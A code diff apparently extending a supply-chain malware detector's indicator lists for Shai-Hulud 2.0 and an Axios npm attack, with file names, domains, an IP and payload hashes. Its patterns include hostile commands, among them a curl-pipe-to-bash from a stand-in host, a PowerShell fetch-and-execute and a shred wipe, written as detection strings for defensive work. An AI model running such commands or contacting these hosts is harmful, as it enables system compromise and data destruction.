@@ -6,8 +6,21 @@
  * They are stored in plain text for transparency.
  */
 
-export const MALWARE_FILENAMES = ['setup_bun.js', 'bun_environment.js', 'shai-hulud.js', 'worm.js'];
+export const MALWARE_FILENAMES = [
+  // Shai-Hulud 2.0
+  'setup_bun.js',
+  'bun_environment.js',
+  'shai-hulud.js',
+  'worm.js',
+  // Axios supply chain attack (March 2026)
+  'setup.js',
+  'com.apple.act.mond',
+  'ld.py',
+  '6202033.ps1',
+  '6202033.vbs',
+];
 export const MALWARE_PATTERNS = [
+  // Shai-Hulud 2.0
   'Shai-Hulud',
   'The Second Coming',
   'shred -uvz -n 1',
@@ -15,4 +28,22 @@ export const MALWARE_PATTERNS = [
   'irm bun.sh/install.ps1|iex',
   'curl -sL http://malicious.com | bash',
   'node setup_bun.js',
+  // Axios supply chain attack (March 2026)
+  'plain-crypto-js',
+  'sfrclak.com',
+  'calltan.com',
+  'callnrwise.com',
+  'OrDeR_7077',
+  '142.11.206.73',
+  'node setup.js',
+  'com.apple.act.mond',
+  'packages.npm.org/product',
+  'mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)',
 ];
+
+// Axios attack stage-2 payload hashes (SHA-256)
+export const AXIOS_MALWARE_HASHES = new Set([
+  '92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a', // macOS RAT: com.apple.act.mond
+  '617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101', // Windows RAT: 6202033.ps1
+  'fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf', // Linux RAT: ld.py
+]);
